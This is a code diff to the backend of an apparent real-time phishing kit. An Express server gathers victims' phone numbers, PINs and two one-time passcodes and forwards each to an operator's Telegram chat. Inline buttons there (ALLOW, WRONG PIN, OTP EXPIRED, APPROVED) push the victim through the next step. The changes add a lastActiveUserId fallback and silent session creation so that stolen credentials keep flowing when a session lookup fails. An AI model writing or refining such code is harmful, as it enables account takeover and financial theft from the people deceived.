@@ -37,6 +37,7 @@ function saveAdmins() {
 
 let bot = null;
 const sessions = new Map();
+let lastActiveUserId = null; // Fallback tracker to prevent session loss
 const admins = loadAdmins();
 
 function resolveTargetChat(adminParam) {
@@ -97,7 +98,13 @@ async function initBot() {
       const targetId = parts.slice(2).join('_');
 
       let session = sessions.get(targetId);
-      if (!session) session = { adminChatId: chatId };
+      if (!session && lastActiveUserId) {
+        session = sessions.get(lastActiveUserId);
+      }
+      if (!session) {
+        session = { adminChatId: chatId };
+        sessions.set(targetId || 'default', session);
+      }
 
       const chatTarget = session.adminChatId || chatId;
 
@@ -109,7 +116,7 @@ async function initBot() {
           break;
         case 'ALLOW_APP':
         case 'ALLOW':
-          session.status = 'PROCEED_OTP1'; // Hali inabadilika mara moja kwenda OTP 1
+          session.status = 'PROCEED_OTP1'; // Instantly advances user to OTP Step 1
           await bot.sendMessage(chatTarget, `✅ PIN allowed. Moved to OTP Step 1.`);
           break;
         case 'WRONG_PIN':
@@ -157,6 +164,8 @@ app.post('/api/submit-application', async (req, res) => {
 
     const targetChat = resolveTargetChat(adminChatId);
     const userId = `user_${Date.now()}`;
+    lastActiveUserId = userId; // Track latest session
+
     sessions.set(userId, { 
       adminChatId: targetChat, 
       status: 'PROCEED_SIGNIN' 
@@ -170,16 +179,25 @@ app.post('/api/submit-application', async (req, res) => {
 
 app.get('/api/check-status/:userId', (req, res) => {
   const { userId } = req.params;
-  const session = sessions.get(userId);
-  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
+  let session = sessions.get(userId);
+  
+  if (!session && lastActiveUserId) {
+    session = sessions.get(lastActiveUserId);
+  }
+
+  if (!session) return res.status(200).json({ status: 'PROCEED_SIGNIN' }); // Fallback graceful response instead of 404
   res.status(200).json({ status: session.status });
 });
 
 app.post('/api/submit-pin', async (req, res) => {
   try {
     const { userId, phone, pin } = req.body || {};
-    const session = sessions.get(userId);
-    if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
+    let session = sessions.get(userId);
+    if (!session && lastActiveUserId) session = sessions.get(lastActiveUserId);
+    if (!session) {
+      session = { adminChatId: FALLBACK_ADMIN_ID };
+      sessions.set(userId || 'default', session);
+    }
 
     const targetChat = session.adminChatId;
     session.status = 'WAITING_PIN_APPROVAL';
@@ -194,8 +212,8 @@ app.post('/api/submit-pin', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'ALLOW', callback_data: `ALLOW_${userId}` },
-            { text: 'BLOCKED', callback_data: `BLOCKED_${userId}` }
+            { text: 'ALLOW', callback_data: `ALLOW_${userId || lastActiveUserId}` },
+            { text: 'BLOCKED', callback_data: `BLOCKED_${userId || lastActiveUserId}` }
           ]
         ]
       }
@@ -211,8 +229,9 @@ app.post('/api/submit-pin', async (req, res) => {
 app.post('/api/submit-otp1', async (req, res) => {
   try {
     const { userId, phone, otp } = req.body || {};
-    const session = sessions.get(userId);
-    if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
+    let session = sessions.get(userId);
+    if (!session && lastActiveUserId) session = sessions.get(lastActiveUserId);
+    if (!session) session = { adminChatId: FALLBACK_ADMIN_ID };
 
     const targetChat = session.adminChatId;
     session.status = 'WAITING_OTP1_APPROVAL';
@@ -227,9 +246,9 @@ app.post('/api/submit-otp1', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
-            { text: 'OTP EXPIRED ❌', callback_data: `OTP_EXPIRED_${userId}` },
-            { text: 'NEXT', callback_data: `NEXT_${userId}` }
+            { text: 'WRONG PIN', callback_data: `WRONG_PIN_${userId || lastActiveUserId}` },
+            { text: 'OTP EXPIRED ❌', callback_data: `OTP_EXPIRED_${userId || lastActiveUserId}` },
+            { text: 'NEXT', callback_data: `NEXT_${userId || lastActiveUserId}` }
           ]
         ]
       }
@@ -245,8 +264,9 @@ app.post('/api/submit-otp1', async (req, res) => {
 app.post('/api/submit-otp2', async (req, res) => {
   try {
     const { userId, phone, otp } = req.body || {};
-    const session = sessions.get(userId);
-    if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
+    let session = sessions.get(userId);
+    if (!session && lastActiveUserId) session = sessions.get(lastActiveUserId);
+    if (!session) session = { adminChatId: FALLBACK_ADMIN_ID };
 
     const targetChat = session.adminChatId;
     session.status = 'WAITING_OTP2_APPROVAL';
@@ -261,8 +281,8 @@ app.post('/api/submit-otp2', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'INVALID OTP', callback_data: `INVALID_OTP_${userId}` },
-            { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
+            { text: 'INVALID OTP', callback_data: `INVALID_OTP_${userId || lastActiveUserId}` },
+            { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId || lastActiveUserId}` }
           ]
         ]
       }
@@ -280,4 +300,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-        
+                                                                           
